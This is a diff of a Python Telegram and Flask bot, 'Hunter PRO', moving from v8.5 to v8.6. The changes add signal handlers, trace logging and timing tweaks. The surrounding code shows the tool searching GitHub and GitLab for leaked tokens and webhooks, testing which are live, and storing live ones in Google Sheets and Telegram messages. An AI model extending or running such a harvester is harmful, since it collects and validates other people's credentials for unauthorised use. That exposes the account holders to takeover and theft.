@@ -2,11 +2,13 @@ import os
 import re
 import io
 import csv
+import sys
 import html
 import time
 import json
 import base64
 import random
+import signal
 import urllib.parse
 import threading
 import traceback
@@ -61,13 +63,13 @@ app = Flask(__name__)
 
 search_session = requests.Session()
 search_session.headers.update({
-    "User-Agent": "HunterPRO-Scanner/8.5 (+https://github.com)",
+    "User-Agent": "HunterPRO-Scanner/8.6 (+https://github.com)",
     "Accept": "application/json",
 })
 
 
 # =====================================================================
-# 2. ВРЕМЯ ПО КИЕВУ И СУПЕР-ОТЛАДКА ([TRACE])
+# 2. ВРЕМЯ ПО КИЕВУ, СИГНАЛЫ ОС И СУПЕР-ОТЛАДКА ([TRACE])
 # =====================================================================
 def now_kyiv() -> datetime:
     if KYIV_TZ is not None:
@@ -93,6 +95,24 @@ def trace(msg: str) -> None:
     print(f"[{kyiv_time_str('%H:%M:%S.%f')[:-3]}] [TRACE:{th_name}] {msg}", flush=True)
 
 
+def _install_signal_handlers() -> None:
+    def _on_sig(signum, frame):
+        print(
+            f"[{kyiv_time_str('%H:%M:%S')}] [SIGNAL] Получен сигнал {signum} (PID={os.getpid()})",
+            flush=True,
+        )
+        if signum == signal.SIGTERM:
+            sys.exit(0)
+
+    for sig_name in ("SIGTERM", "SIGINT"):
+        sig = getattr(signal, sig_name, None)
+        if sig is not None:
+            try:
+                signal.signal(sig, _on_sig)
+            except Exception:
+                pass
+
+
 def _install_thread_excepthook() -> None:
     def _hook(args):
         print(
@@ -105,6 +125,7 @@ def _install_thread_excepthook() -> None:
         threading.excepthook = _hook
 
 
+_install_signal_handlers()
 _install_thread_excepthook()
 
 
@@ -546,6 +567,7 @@ def save_live_token(token_data: Dict[str, Any]) -> bool:
         threading.Thread(
             target=save_to_google_sheets,
             args=(token_data,),
+            name="SheetsSave",
             daemon=True,
         ).start()
     return added
@@ -560,7 +582,7 @@ def _direct_get_json(
     timeout: Tuple[float, float] = TARGET_TIMEOUT,
 ) -> Tuple[int, Optional[Dict[str, Any]], Optional[str]]:
     req_headers = {
-        "User-Agent": "HunterPRO-Verifier/8.5",
+        "User-Agent": "HunterPRO-Verifier/8.6",
         "Accept": "application/json",
         "Connection": "close",
     }
@@ -817,10 +839,12 @@ def manual_check_target(raw_input: str) -> Tuple[str, Optional[Dict[str, Any]]]:
 # 8. ПОИСК ПО GITHUB И GITLAB
 # =====================================================================
 def _sleep_respecting_stop(seconds: float) -> None:
+    trace(f"Сон {seconds:.1f}с (с проверкой stop_requested)")
     deadline = time.time() + max(0.0, seconds)
     while time.time() < deadline:
         with state_lock:
             if search_state["stop_requested"]:
+                trace("Сон прерван: stop_requested=True")
                 break
         time.sleep(0.35)
 
@@ -904,6 +928,7 @@ def _build_search_query(hunt_mode: str) -> str:
 
 
 def search_github_dynamic() -> Tuple[List[Dict[str, str]], int]:
+    trace("search_github_dynamic: старт")
     if not GITHUB_TOKEN:
         notify_critical_error(
             "github_missing_token",
@@ -946,7 +971,9 @@ def search_github_dynamic() -> Tuple[List[Dict[str, str]], int]:
             timeout=(2.5, 6.0),
         )
         dt = time.time() - t0
-        trace(f"GitHub ответил {resp.status_code} за {dt:.2f}с (remaining={resp.headers.get('X-RateLimit-Remaining')})")
+        rem = resp.headers.get("X-RateLimit-Remaining")
+        reset_hdr = resp.headers.get("X-RateLimit-Reset")
+        trace(f"GitHub ответил {resp.status_code} за {dt:.2f}с (remaining={rem}, reset={reset_hdr})")
 
         if resp.status_code == 401:
             set_status("❌ Ошибка авторизации GitHub Token!")
@@ -960,10 +987,9 @@ def search_github_dynamic() -> Tuple[List[Dict[str, str]], int]:
             return [], 401
 
         if resp.status_code in (403, 429):
-            reset_ts = resp.headers.get("X-RateLimit-Reset")
             wait_sec = 60
-            if reset_ts and reset_ts.isdigit():
-                calc = int(reset_ts) - int(time.time()) + 2
+            if reset_hdr and reset_hdr.isdigit():
+                calc = int(reset_hdr) - int(time.time()) + 2
                 wait_sec = max(5, min(calc, 180))
             set_status(f"⚠️ Лимит GitHub API. Пауза {wait_sec}с")
             add_log(f"⏳ Rate limit GitHub ({resp.status_code}). Жду {wait_sec} сек.")
@@ -1003,7 +1029,8 @@ def search_github_dynamic() -> Tuple[List[Dict[str, str]], int]:
                 findings.append(item_found)
 
         add_log(f"📦 GitHub нашёл кандидатов: {len(findings)} (пропущено шумных репо: {skipped_repos})")
-        _sleep_respecting_stop(2.0)
+        _sleep_respecting_stop(1.5)
+        trace("search_github_dynamic: конец")
         return findings, 200
 
     except requests.RequestException as exc:
@@ -1018,6 +1045,7 @@ def search_github_dynamic() -> Tuple[List[Dict[str, str]], int]:
 
 
 def search_gitlab() -> List[Dict[str, str]]:
+    trace("search_gitlab: старт")
     if not GITLAB_TOKEN:
         return []
 
@@ -1110,6 +1138,7 @@ def search_gitlab() -> List[Dict[str, str]]:
     except Exception as exc:
         add_log(f"⚠️ Ошибка GitLab: {str(exc)[:40]}")
 
+    trace("search_gitlab: конец")
     return findings
 
 
@@ -1481,7 +1510,7 @@ def send_welcome(message: types.Message):
     cur_hunt = HUNT_MODES.get(snap["hunt_mode"], snap["hunt_mode"])
 
     welcome_text = (
-        "👋 <b>Пульт Hunter PRO v8.5</b>\n"
+        "👋 <b>Пульт Hunter PRO v8.6</b>\n"
         "Сканер токенов и вебхуков с супер-отладкой, ручной проверкой, досье (вкл. webhook), режимами охоты, фильтрами и экспортом.\n\n"
         f"☁️ Google Sheets: <code>{html.escape(sheets_status)}</code>\n"
         f"🎯 Охота: <code>{html.escape(cur_hunt)}</code>\n"
@@ -2240,6 +2269,7 @@ def _matches_session_filter(f_type: str, is_scam: bool, filter_mode: str) -> boo
 
 
 def process_single_finding(finding: Dict[str, str], chat_id: int) -> None:
+    trace(f"process_single_finding старт: type={finding.get('type')}, repo={finding.get('repo')}")
     with state_lock:
         if search_state["stop_requested"] or search_state["found_live_current"] >= search_state["limit_live"]:
             trace("process_single_finding прерван: stop или лимит")
@@ -2273,15 +2303,18 @@ def process_single_finding(finding: Dict[str, str], chat_id: int) -> None:
             search_state["dead_tokens"] += 1
             suffix = f" ({err_reason})" if err_reason else ""
             add_log(f"❌ #{checked_now} Мёртвый {f_type} [{repo[:24]}]{suffix}")
+            trace("process_single_finding конец (мёртвый)")
             return
 
         if search_state["found_live_current"] >= search_state["limit_live"]:
+            trace("process_single_finding конец (лимит)")
             return
 
         cur_filter = search_state["filter_mode"]
         if not _matches_session_filter(f_type, is_scam, cur_filter):
             search_state["skipped_by_filter"] += 1
             add_log(f"⏭️ #{checked_now} Пропущено фильтром [{cur_filter}]: {f_type}")
+            trace("process_single_finding конец (фильтр)")
             return
 
         search_state["found_live_current"] += 1
@@ -2334,6 +2367,8 @@ def process_single_finding(finding: Dict[str, str], chat_id: int) -> None:
         )
     except Exception as exc:
         add_log(f"⚠️ Не удалось отправить карточку в TG: {str(exc)[:35]}")
+
+    trace("process_single_finding конец (живой)")
 
 
 def _build_final_summary(snap: Dict[str, Any]) -> str:
@@ -2452,6 +2487,7 @@ def run_search_task(chat_id: int, msg_id: int) -> None:
 # 13. ЗАПУСК ПОЛЛИНГА БОТА (УСТОЙЧИВОСТЬ К 409 CONFLICT) И FLASK
 # =====================================================================
 def run_bot_polling() -> None:
+    trace("BotPolling поток запущен")
     time.sleep(3)
     try:
         bot.remove_webhook()
@@ -2461,6 +2497,7 @@ def run_bot_polling() -> None:
     conflict_streak = 0
     while True:
         try:
+            trace("Запуск infinity_polling...")
             bot.infinity_polling(
                 timeout=30,
                 long_polling_timeout=25,
@@ -2489,7 +2526,7 @@ def run_bot_polling() -> None:
 
 
 if __name__ == "__main__":
-    trace("Старт приложения Hunter PRO v8.5")
+    trace(f"Старт приложения Hunter PRO v8.6 (PID={os.getpid()})")
     if SPREADSHEET_ID and (GOOGLE_CREDS_B64 or GOOGLE_CREDS_JSON_RAW):
         threading.Thread(target=get_google_worksheet, name="SheetsStartup", daemon=True).start()
 
